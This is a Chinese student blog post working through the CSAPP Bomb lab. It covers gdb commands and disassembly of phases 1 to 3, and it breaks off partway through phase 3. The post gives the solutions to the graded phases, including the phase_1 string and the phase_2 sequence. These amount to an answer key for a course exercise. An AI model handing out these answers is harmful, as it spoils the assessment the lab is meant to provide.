<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">








<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">










  <meta name="baidu-site-verification" content="HqDOiGSjrA">







  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/star.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/star.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/star.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="大四,CSAPP,">










<meta name="description" content="CSAPP的配套lab，之前混日子欠的债迟早是要还的orz">
<meta name="keywords" content="大四,CSAPP">
<meta property="og:type" content="article">
<meta property="og:title" content="ICS lab">
<meta property="og:url" content="https://stardust567.github.io/post/9f31.html">
<meta property="og:site_name" content="Star Trail">
<meta property="og:description" content="CSAPP的配套lab，之前混日子欠的债迟早是要还的orz">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.loli.net/2021/10/14/Tgv1pU8zqs5bt7o.png">
<meta property="og:image" content="https://i.loli.net/2021/10/17/PnhSeJwqE1ZLvjC.jpg">
<meta property="og:image" content="https://i.loli.net/2021/11/07/nKRrPxZClsQac27.png">
<meta property="og:image" content="https://i.loli.net/2021/11/07/IiEweaxW5J9fQYq.png">
<meta property="og:updated_time" content="2021-12-19T14:52:35.019Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ICS lab">
<meta name="twitter:description" content="CSAPP的配套lab，之前混日子欠的债迟早是要还的orz">
<meta name="twitter:image" content="https://i.loli.net/2021/10/14/Tgv1pU8zqs5bt7o.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://stardust567.github.io/post/9f31.html">






  <title>ICS lab | Star Trail</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', '130666690', 'auto');
  ga('send', 'pageview');
</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Star Trail</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">stardust1084062596@gmail.com</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-link">
          <a href="/links/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
            
            友链
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://stardust567.github.io/post/9f31.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Stardust567">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Star Trail">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">ICS lab</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">写于</span>
              
              <time title="写于" itemprop="dateCreated datePublished" datetime="2021-10-14T14:19:54+08:00">
                2021-10-14
              </time>
            

            

            
          </span>
			
          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">归档</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Sys/" itemprop="url" rel="index">
                    <span itemprop="name">Sys</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/post/9f31.html#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/post/9f31.html" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/post/9f31.html" class="leancloud_visitors" data-flag-title="ICS lab">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">翻阅&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">共计&#58;</span>
                
                <span title="共计">
                  19.4k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">时长 &asymp;</span>
                
                <span title="时长">
                  90 min
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CSAPP的配套lab，之前混日子欠的债迟早是要还的orz<a id="more"></a></p>
<h1 id="Bomb"><a href="#Bomb" class="headerlink" title="Bomb"></a>Bomb</h1><p>Bomb实验要求是给一个用C语言编写的可执行文件bomb，你可以看到它主函数的C语言代码，除此之外，一概不知，实验分为六个阶段，每个阶段需要输入一串字符，有点像破译密码，如果六次输入的密码都是对的，炸弹解除，否则炸弹会爆炸(退出，并打印爆炸信息)</p>
<h2 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h2><p>根据题目的要求以及提示，我们可以将bomb可执行文件反汇编，对汇编语言代码进行逆向分析，而gdb是我们调试汇编语言的有效工具。</p>
<h3 id="gdb常用命令"><a href="#gdb常用命令" class="headerlink" title="gdb常用命令"></a>gdb常用命令</h3><div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>gdb filename</td>
<td>开始调试</td>
</tr>
<tr>
<td>run</td>
<td>开始运行</td>
</tr>
<tr>
<td>run 1 2 3</td>
<td>开始运行,并且传入参数1，2，3</td>
</tr>
<tr>
<td>kill</td>
<td>停止运行</td>
</tr>
<tr>
<td>quit</td>
<td>退出gdb</td>
</tr>
<tr>
<td>break sum</td>
<td>在sum函数的开头设置断点</td>
</tr>
<tr>
<td>break *0x8048c3</td>
<td>在0x8048c3的地址处设置断点</td>
</tr>
<tr>
<td>delete 1</td>
<td>删除断点1</td>
</tr>
<tr>
<td>clear sum</td>
<td>删除在sum函数入口的断点</td>
</tr>
<tr>
<td>stepi</td>
<td>运行一条指令</td>
</tr>
<tr>
<td>stepi 4</td>
<td>运行4条指令</td>
</tr>
<tr>
<td>continue</td>
<td>运行到下一个断点</td>
</tr>
<tr>
<td>disas sum</td>
<td>反汇编sum函数</td>
</tr>
<tr>
<td>disas 0X12345</td>
<td>反汇编入口在0x12345的函数</td>
</tr>
<tr>
<td>print /x /d /t $rax</td>
<td>将rax里的内容以16进制，10进制，2进制的形式输出</td>
</tr>
<tr>
<td>print 0x888</td>
<td>输出0x888的十进制形式</td>
</tr>
<tr>
<td>print <em>(int</em>)0x123456</td>
<td>将0x123456地址所存储的内容以数字形式输出</td>
</tr>
<tr>
<td>print (char*)0x123456</td>
<td>输出存储在0x123456的字符串</td>
</tr>
<tr>
<td>x/w $rsp</td>
<td>解析在rsp所指向位置的word</td>
</tr>
<tr>
<td>x/2w $rsp</td>
<td>解析在rsp所指向位置的两个word</td>
</tr>
<tr>
<td>x/2wd $rsp</td>
<td>解析在rsp所指向位置的word，以十进制形式输出</td>
</tr>
<tr>
<td>info registers</td>
<td>寄存器信息</td>
</tr>
<tr>
<td>info functions</td>
<td>函数信息</td>
</tr>
<tr>
<td>info stack</td>
<td>栈信息</td>
</tr>
</tbody>
</table>
</div>
<h3 id="x86-64寄存器"><a href="#x86-64寄存器" class="headerlink" title="x86-64寄存器"></a>x86-64寄存器</h3><p><img src="https://i.loli.net/2021/10/14/Tgv1pU8zqs5bt7o.png" alt="ICS-bomb-register.png"></p>
<h2 id="解决流程"><a href="#解决流程" class="headerlink" title="解决流程"></a>解决流程</h2><p>先通过<code>objdump -d bomb &gt; bomb.txt</code>将可执行文件反汇编出来观察一下，会在main函数里发现这样的汇编：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">400</span>e32:	e8 <span class="number">67</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40149</span>e &lt;read_line&gt;</span><br><span class="line"><span class="number">400</span>e37:	<span class="number">48</span> <span class="number">89</span> c7             	mov    %rax,%rdi</span><br><span class="line"><span class="number">400</span>e3a:	e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">400</span>ee0 &lt;phase_1&gt;</span><br><span class="line"><span class="number">400</span>e3f:	e8 <span class="number">80</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">4015</span>c4 &lt;phase_defused&gt;</span><br><span class="line"><span class="number">400</span>e44:	bf a8 <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>       	mov    <span class="variable">$0x4023a8</span>,%edi</span><br><span class="line"><span class="number">400</span>e49:	e8 c2 fc ff ff       	callq  <span class="number">400</span>b10 &lt;puts@plt&gt;</span><br><span class="line"><span class="number">400</span>e4e:	e8 <span class="number">4</span>b <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40149</span>e &lt;read_line&gt;</span><br><span class="line"><span class="number">400</span>e53:	<span class="number">48</span> <span class="number">89</span> c7             	mov    %rax,%rdi</span><br><span class="line"><span class="number">400</span>e56:	e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">400</span>efc &lt;phase_2&gt;</span><br><span class="line"><span class="number">400</span>e5b:	e8 <span class="number">64</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">4015</span>c4 &lt;phase_defused&gt;</span><br><span class="line"><span class="number">400</span>e60:	bf ed <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>       	mov    <span class="variable">$0x4022ed</span>,%edi</span><br><span class="line"><span class="number">400</span>e65:	e8 a6 fc ff ff       	callq  <span class="number">400</span>b10 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到这个函数的作用是通过readline读取输入值然后调用phase_1函数，那我们再来看看phase_1函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>那么我们有理由猜测explode_bomb函数所实现的功能就是“BOMB”于是我们开始设置断点找到关键词。</p>
<h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>设置断点然后用随便的test值运行一下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="keyword">break</span> explode_bomb</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x40143a</span><br><span class="line">(gdb) <span class="keyword">break</span> phase_1</span><br><span class="line">Breakpoint <span class="number">2</span> at <span class="number">0</span>x400ee0</span><br><span class="line">(gdb) run</span><br><span class="line">Starting program: /mnt/e/Program/ipads/training/ics-lab/bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have <span class="number">6</span> phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">2</span>, <span class="number">0</span>x0000000000400ee0 <span class="keyword">in</span> phase_1 ()</span><br></pre></td></tr></table></figure>
<p>观察对应汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_1:</span><br><span class="line">=&gt; 0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi</span><br><span class="line">   0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<blockquote>
<p>read_line函数会将读入字符串地址存放在rdi 和rsi中，strings_not_equal函数会使用edi和esi中的值当做两个字符址，并且判断他们是否相等，相等返回0</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(gdb) stepi 2</span><br><span class="line">0x0000000000400ee9 in phase_1 ()</span><br><span class="line">(gdb) info registers</span><br><span class="line">rax            0x603780 6305664</span><br><span class="line">rbx            0x0      0</span><br><span class="line">rcx            0x4      4</span><br><span class="line">rdx            0x1      1</span><br><span class="line">rsi            0x402400 4203520</span><br><span class="line">rdi            0x603780 6305664</span><br><span class="line">rbp            0x402210 0x402210 &lt;__libc_csu_init&gt;</span><br><span class="line">rsp            0x7ffffffedb60   0x7ffffffedb60</span><br><span class="line">r8             0x604475 6308981</span><br><span class="line">r9             0x7fffff7e1540   140737479841088</span><br><span class="line">r10            0x3      3</span><br><span class="line">r11            0x7fffff030890   140737471776912</span><br><span class="line">r12            0x400c90 4197520</span><br><span class="line">r13            0x7ffffffedc50   140737488280656</span><br><span class="line">r14            0x0      0</span><br><span class="line">r15            0x0      0</span><br><span class="line">rip            0x400ee9 0x400ee9 &lt;phase_1+9&gt;</span><br><span class="line">eflags         0x206    [ PF IF ]</span><br><span class="line">cs             0x33     51</span><br><span class="line">ss             0x2b     43</span><br><span class="line">ds             0x0      0</span><br><span class="line">es             0x0      0</span><br><span class="line">fs             0x0      0</span><br><span class="line">gs             0x0      0</span><br><span class="line">(gdb) print (char*)0x603780</span><br><span class="line">$3 = 0x603780 &lt;input_strings&gt; &quot;test&quot;</span><br><span class="line">(gdb) print (char*)0x402400</span><br><span class="line">$4 = 0x402400 &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>
<p>phase_1函数首先将0x402400这个赋值给esi，然后调用strings_not_equal,　而在每次调用phase_n之前都会先调用read_line读入一行并且放在edi和esi。显然这里是调用字符串比较函数比较我们输入的字符串和存放在0x402400地址的字符串是否相等，紧接着调用test指令，如果eax为0也就是两个字符串相等就跳转到函数结尾，否则调用explode_bomb函数，这个就是引爆炸弹的函数。到这里答案也就出来了，我们需要输入的就是存放在0x402400处的字符串。</p>
<h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>接下来让我们开始第二个phase：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 3 4 5 6</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x0000000000400efc in phase_2 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_2:</span><br><span class="line">=&gt; 0x0000000000400efc &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x0000000000400efd &lt;+1&gt;:     push   %rbx</span><br><span class="line">   0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp</span><br><span class="line">   0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400f05 &lt;+9&gt;:     callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)</span><br><span class="line">   0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f10 &lt;+20&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax</span><br><span class="line">   0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400f20 &lt;+36&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx</span><br><span class="line">   0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp</span><br><span class="line">   0x0000000000400f40 &lt;+68&gt;:    pop    %rbx</span><br><span class="line">   0x0000000000400f41 &lt;+69&gt;:    pop    %rbp</span><br><span class="line">   0x0000000000400f42 &lt;+70&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>一开始调用了read_six_numbers函数，显然这次要求的输入是6个数字，但为了严谨我们还是跳进去看一眼：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi</span><br><span class="line">   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x000000000040148a &lt;+46&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">......</span><br><span class="line">(gdb) stepi 17</span><br><span class="line">0x0000000000400bf0 in __isoc99_sscanf@plt ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function __isoc99_sscanf@plt:</span><br><span class="line">=&gt; 0x0000000000400bf0 &lt;+0&gt;:     jmpq   *0x202492(%rip)        # 0x603088 &lt;__isoc99_sscanf@got.plt&gt;</span><br><span class="line">   0x0000000000400bf6 &lt;+6&gt;:     pushq  $0x11</span><br><span class="line">   0x0000000000400bfb &lt;+11&gt;:    jmpq   0x400ad0</span><br><span class="line">(gdb) info register</span><br><span class="line">......</span><br><span class="line">rsi            0x4025c3 4203971</span><br><span class="line">rdi            0x6037d0 6305744</span><br><span class="line">......</span><br><span class="line">(gdb) print (char*)0x6037d0</span><br><span class="line">$2 = 0x6037d0 &lt;input_strings+80&gt; &quot;1 2 3 4 5 6&quot; </span><br><span class="line">(gdb) print (char*)0x4025c3</span><br><span class="line">$5 = 0x4025c3 &quot;%d %d %d %d %d %d&quot;</span><br></pre></td></tr></table></figure>
<p>由调用类scanf函数，参数是输入字符串和”%d %d %d %d %d %d”，可以确定输入格式是空格隔开的六个数字。</p>
<blockquote>
<p>je     0x400f30 <phase_2+52>  中的 je 为 jmp equal，可以理解为等于就跳转，cmpl   $0x1,(%rsp) 比较栈指针指向的第一个数字是否为1，如果是1则跳转到 lea    0x4(%rsp),%rbx，否则执行 explode_bomb</phase_2+52></p>
</blockquote>
<p>然后第一个数字必须是1，否则会爆炸，数字为1则跳转到+52，即<code>lea 0x4(%rsp),%rbx</code> 把0x4(%rsp)偏移量传送给rbx，%rsp是栈指针的地址，每个int的数据长度为4个bytes，这句话的意思就是说读取下一个数字的地址，存入%rbx里。</p>
<p>然后57行把第六个数字的地址存入rbp里，再跳转到27行，取rbx上一个数字的地址也就是第一个数字存入eax，再让eax自增一个eax，即eax存的值*2，此时再比较rbx和eax存的值是否相等就是在比较第二个数字是否为第一个数字的两倍。如果没问题就取rbx下一位，即第三个数字，先和rbp进行比较判断，如果不等就跳转到27行，相等就跳到函数结尾。27行就是之前的取rbx前一个数然后乘二，看是否与rbx现在的数相等，由此可以判断这个输入应该是 1 2 4 8 16 32</p>
<h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400efc in phase_2 ()</span><br><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line">That&apos;s number 2.  Keep going!</span><br><span class="line">1 2</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x0000000000400f43 in phase_3 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">=&gt; 0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000400f4c &lt;+9&gt;:     lea    